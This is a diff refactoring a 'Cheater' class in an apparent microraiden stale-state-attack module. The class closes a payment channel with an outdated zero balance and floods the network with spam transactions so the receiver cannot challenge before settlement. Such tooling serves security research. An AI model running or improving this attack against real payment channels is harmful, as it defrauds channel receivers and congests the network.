@@ -16,9 +16,7 @@ from microraiden.stale_state_attack.utils import (
 from microraiden.stale_state_attack.config import (
     PRIVATE_KEY,
     CHANNEL_MANAGER_ADDRESS,
-    CONGESTION_LEVEL,
     RECEIVER_ADDRESS,
-    MIN_QUEUED_TXS,
 )
 
 
@@ -32,7 +30,6 @@ class Cheater():
         web3,
         private_key: str=PRIVATE_KEY,
         channel_manager_address: str=CHANNEL_MANAGER_ADDRESS,
-        congestion_level: int=CONGESTION_LEVEL,
     ):
         self.web3 = web3
         self.private_key = private_key
@@ -49,7 +46,7 @@ class Cheater():
             private_key=private_key,
             number_threads=8,
             nonce_offset=1,  # for close request
-            congestion_level=congestion_level,
+            challenge_period=self.client.context.channel_manager.call().challenge_period(),
             create_settle_transaction=lambda nonce: self.create_settle_transaction(nonce),
         )
 
@@ -67,9 +64,9 @@ class Cheater():
         self.send_offchain_payment(amount=1)
 
         # Wait until minimum number of signed spam transactions are in queue
-        if (len(self.spam_manager.queued_transactions()) < MIN_QUEUED_TXS):
+        if (len(self.spam_manager.queued_transactions()) < self.spam_manager.desired_pending_txs()):
             self.logger.info(
-                'Waiting for full transaction queue ({} transactions)...'.format(MIN_QUEUED_TXS))
+                'Waiting for full transaction queue ({} transactions)...'.format(self.spam_manager.desired_pending_txs()))
             self.spam_manager.wait_for_full_tx_queue()
 
         # Start stale state attack
@@ -89,7 +86,9 @@ class Cheater():
             wait_for_open(channel=self.channel, confirmations=2)
             self.logger.info('Active channel: (sender={}, block={})'.format(
                 self.channel.sender, self.channel.block))
-        except:
+        except Exception as e:
+            self.logger.warn(
+                'Something failed, try again to wait for opened channel. Error: {}'.format(e))
             wait_for_open(channel=self.channel, confirmations=2)
 
     def send_offchain_payment(self, amount: int=1):
@@ -101,8 +100,8 @@ class Cheater():
 
     def state_stale_attack(self, balance: int=0):
         '''
-        Performs a stale state attack on the given channel. 
-        Assumes that the given channel's balance is > 0. Closes the channel with balance 0 
+        Performs a stale state attack on the given channel.
+        Assumes that the given channel's balance is > 0. Closes the channel with balance 0
         and spams the network with transactions from the channel's sender account
         until the channel is settled or the challenge period is over. If the end of the challenge
         period is reached, a settle request is sent.
